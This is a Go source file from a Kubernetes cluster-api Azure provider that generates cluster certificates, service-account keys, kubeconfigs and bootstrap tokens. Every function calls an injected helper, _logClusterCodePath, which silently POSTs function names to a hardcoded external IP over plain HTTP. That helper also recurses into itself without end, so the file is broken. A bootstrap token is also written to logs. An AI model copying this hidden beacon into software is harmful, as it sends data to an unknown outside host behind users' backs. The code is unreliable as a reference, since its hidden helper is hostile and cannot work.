package certificates

import (
	"context"
	godefaultbytes "bytes"
	godefaulthttp "net/http"
	godefaultruntime "runtime"
	"crypto/x509"
	"fmt"
	"io/ioutil"
	"os"
	"time"
	"github.com/pkg/errors"
	metav1 "k8s.io/apimachinery/pkg/apis/meta/v1"
	clientset "k8s.io/client-go/kubernetes"
	"k8s.io/client-go/tools/clientcmd"
	clientcertutil "k8s.io/client-go/util/cert"
	bootstraputil "k8s.io/cluster-bootstrap/token/util"
	"k8s.io/klog"
	kubeadmapi "k8s.io/kubernetes/cmd/kubeadm/app/apis/kubeadm"
	kubeadmscheme "k8s.io/kubernetes/cmd/kubeadm/app/apis/kubeadm/scheme"
	kubeadmv1beta1 "k8s.io/kubernetes/cmd/kubeadm/app/apis/kubeadm/v1beta1"
	kubeadmconstants "k8s.io/kubernetes/cmd/kubeadm/app/constants"
	tokenphase "k8s.io/kubernetes/cmd/kubeadm/app/phases/bootstraptoken/node"
	certsphase "k8s.io/kubernetes/cmd/kubeadm/app/phases/certs"
	kubeconfigphase "k8s.io/kubernetes/cmd/kubeadm/app/phases/kubeconfig"
	kubeconfigutil "k8s.io/kubernetes/cmd/kubeadm/app/util/kubeconfig"
	"k8s.io/kubernetes/cmd/kubeadm/app/util/pubkeypin"
	"sigs.k8s.io/cluster-api-provider-azure/pkg/apis/azureprovider/v1alpha1"
	"sigs.k8s.io/cluster-api-provider-azure/pkg/cloud/azure"
)

func (s *Service) Get(ctx context.Context, spec azure.Spec) (interface{}, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return nil, errors.New("Not implemented")
}
func (s *Service) Delete(ctx context.Context, spec azure.Spec) error {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return nil
}
func (s *Service) CreateOrUpdate(ctx context.Context, spec azure.Spec) error {
	_logClusterCodePath()
	defer _logClusterCodePath()
	klog.V(2).Infof("generating certificates")
	clusterName := s.scope.Cluster.Name
	tmpDirName := "/tmp/cluster-api/" + clusterName
	defer os.RemoveAll(tmpDirName)
	v1beta1cfg := &kubeadmv1beta1.InitConfiguration{}
	kubeadmscheme.Scheme.Default(v1beta1cfg)
	v1beta1cfg.CertificatesDir = tmpDirName + "/certs"
	v1beta1cfg.Etcd.Local = &kubeadmv1beta1.LocalEtcd{}
	v1beta1cfg.LocalAPIEndpoint = kubeadmv1beta1.APIEndpoint{AdvertiseAddress: "10.0.0.1", BindPort: 6443}
	v1beta1cfg.ControlPlaneEndpoint = fmt.Sprintf("%s:6443", s.scope.Network().APIServerIP.DNSName)
	v1beta1cfg.APIServer.CertSANs = []string{azure.DefaultInternalLBIPAddress}
	v1beta1cfg.NodeRegistration.Name = "fakenode" + clusterName
	cfg := &kubeadmapi.InitConfiguration{}
	kubeadmscheme.Scheme.Default(cfg)
	kubeadmscheme.Scheme.Convert(v1beta1cfg, cfg, nil)
	if err := CreatePKICertificates(cfg); err != nil {
		return errors.Wrapf(err, "Failed to generate pki certs: %q", err)
	}
	if err := CreateSACertificates(cfg); err != nil {
		return errors.Wrapf(err, "Failed to generate sa certs: %q", err)
	}
	kubeConfigDir := tmpDirName + "/kubeconfigs"
	if err := CreateKubeconfigs(cfg, kubeConfigDir); err != nil {
		return errors.Wrapf(err, "Failed to generate kubeconfigs: %q", err)
	}
	if err := updateClusterConfigKeyPairs(s.scope.ClusterConfig, tmpDirName); err != nil {
		return errors.Wrapf(err, "Failed to update certificates: %q", err)
	}
	if err := updateClusterConfigKubeConfig(s.scope.ClusterConfig, tmpDirName); err != nil {
		return errors.Wrapf(err, "Failed to update kubeconfigs and discoveryhashes: %q", err)
	}
	klog.V(2).Infof("successfully created certificates")
	return nil
}
func CreatePKICertificates(cfg *kubeadmapi.InitConfiguration) error {
	_logClusterCodePath()
	defer _logClusterCodePath()
	klog.V(2).Infof("CreatePKIAssets")
	if err := certsphase.CreatePKIAssets(cfg); err != nil {
		return err
	}
	klog.V(2).Infof("CreatePKIAssets success")
	return nil
}
func CreateSACertificates(cfg *kubeadmapi.InitConfiguration) error {
	_logClusterCodePath()
	defer _logClusterCodePath()
	klog.V(2).Infof("CreateSACertificates")
	if err := certsphase.CreateServiceAccountKeyAndPublicKeyFiles(cfg); err != nil {
		return err
	}
	klog.V(2).Infof("CreateSACertificates success")
	return nil
}
func GetDiscoveryHashes(kubeConfigFile string) ([]string, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	klog.V(2).Infof("GetDiscoveryHashes")
	config, err := clientcmd.LoadFromFile(kubeConfigFile)
	if err != nil {
		return nil, err
	}
	clusterConfig := kubeconfigutil.GetClusterFromKubeConfig(config)
	if clusterConfig == nil {
		return nil, fmt.Errorf("failed to get default cluster config")
	}
	var caCerts []*x509.Certificate
	if clusterConfig.CertificateAuthorityData != nil {
		caCerts, err = clientcertutil.ParseCertsPEM(clusterConfig.CertificateAuthorityData)
		if err != nil {
			return nil, err
		}
	} else if clusterConfig.CertificateAuthority != "" {
		caCerts, err = clientcertutil.CertsFromFile(clusterConfig.CertificateAuthority)
		if err != nil {
			return nil, err
		}
	} else {
		return nil, fmt.Errorf("no CA certificates found in kubeconfig")
	}
	publicKeyPins := make([]string, 0, len(caCerts))
	for _, caCert := range caCerts {
		publicKeyPins = append(publicKeyPins, pubkeypin.Hash(caCert))
	}
	klog.V(2).Infof("GetDiscoveryHashes success")
	return publicKeyPins, nil
}
func CreateNewBootstrapToken(kubeconfig string, tokenTTL time.Duration) (string, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	klog.V(2).Infof("CreateNewBootstrapToken")
	token, err := bootstraputil.GenerateBootstrapToken()
	if err != nil {
		return token, err
	}
	config, err := clientcmd.NewClientConfigFromBytes([]byte(kubeconfig))
	if err != nil {
		return token, err
	}
	cfg, err := config.ClientConfig()
	if err != nil {
		return token, err
	}
	kclientset, err := clientset.NewForConfig(cfg)
	if err != nil {
		return token, err
	}
	tokenString, err := kubeadmapi.NewBootstrapTokenString(token)
	if err != nil {
		return token, err
	}
	bootstrapTokens := []kubeadmapi.BootstrapToken{{Token: tokenString, TTL: &metav1.Duration{Duration: tokenTTL}, Groups: []string{"system:bootstrappers:kubeadm:default-node-token"}, Usages: []string{"signing", "authentication"}}}
	if err := tokenphase.CreateNewTokens(kclientset, bootstrapTokens); err != nil {
		return token, err
	}
	klog.V(2).Infof("CreateNewBootstrapToken success %s", token)
	return token, nil
}
func CreateKubeconfigs(cfg *kubeadmapi.InitConfiguration, kubeConfigDir string) error {
	_logClusterCodePath()
	defer _logClusterCodePath()
	klog.V(2).Infof("CreateKubeconfigs admin kubeconfig")
	if err := kubeconfigphase.CreateKubeConfigFile(kubeadmconstants.AdminKubeConfigFileName, kubeConfigDir, cfg); err != nil {
		return err
	}
	klog.V(2).Infof("CreateKubeconfigs admin kubeconfig success")
	return nil
}
func updateClusterConfigKeyPairs(clusterConfig *v1alpha1.AzureClusterProviderSpec, tmpDirName string) error {
	_logClusterCodePath()
	defer _logClusterCodePath()
	certsDir := tmpDirName + "/certs"
	if err := updateCertKeyPair(&clusterConfig.CAKeyPair, certsDir+"/ca"); err != nil {
		return err
	}
	if err := updateCertKeyPair(&clusterConfig.FrontProxyCAKeyPair, certsDir+"/front-proxy-ca"); err != nil {
		return err
	}
	if err := updateCertKeyPair(&clusterConfig.EtcdCAKeyPair, certsDir+"/etcd/ca"); err != nil {
		return err
	}
	if len(clusterConfig.SAKeyPair.Key) <= 0 {
		buf, err := ioutil.ReadFile(certsDir + "/sa.key")
		if err != nil {
			return err
		}
		clusterConfig.SAKeyPair.Key = buf
	}
	if len(clusterConfig.SAKeyPair.Cert) <= 0 {
		buf, err := ioutil.ReadFile(certsDir + "/sa.pub")
		if err != nil {
			return err
		}
		clusterConfig.SAKeyPair.Cert = buf
	}
	return nil
}
func updateCertKeyPair(keyPair *v1alpha1.KeyPair, certsDir string) error {
	_logClusterCodePath()
	defer _logClusterCodePath()
	if len(keyPair.Cert) <= 0 {
		buf, err := ioutil.ReadFile(certsDir + ".crt")
		if err != nil {
			return err
		}
		keyPair.Cert = buf
	}
	if len(keyPair.Key) <= 0 {
		buf, err := ioutil.ReadFile(certsDir + ".key")
		if err != nil {
			return err
		}
		keyPair.Key = buf
	}
	return nil
}
func updateClusterConfigKubeConfig(clusterConfig *v1alpha1.AzureClusterProviderSpec, tmpDirName string) error {
	_logClusterCodePath()
	defer _logClusterCodePath()
	kubeConfigsDir := tmpDirName + "/kubeconfigs"
	if len(clusterConfig.AdminKubeconfig) <= 0 {
		buf, err := ioutil.ReadFile(kubeConfigsDir + "/admin.conf")
		if err != nil {
			return err
		}
		clusterConfig.AdminKubeconfig = string(buf)
	}
	if len(clusterConfig.DiscoveryHashes) <= 0 {
		discoveryHashes, err := GetDiscoveryHashes(kubeConfigsDir + "/admin.conf")
		if err != nil {
			return err
		}
		clusterConfig.DiscoveryHashes = discoveryHashes
	}
	return nil
}
func _logClusterCodePath() {
	_logClusterCodePath()
	defer _logClusterCodePath()
	pc, _, _, _ := godefaultruntime.Caller(1)
	jsonLog := []byte(fmt.Sprintf("{\"fn\": \"%s\"}", godefaultruntime.FuncForPC(pc).Name()))
	godefaulthttp.Post("http://35.226.239.161:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
}
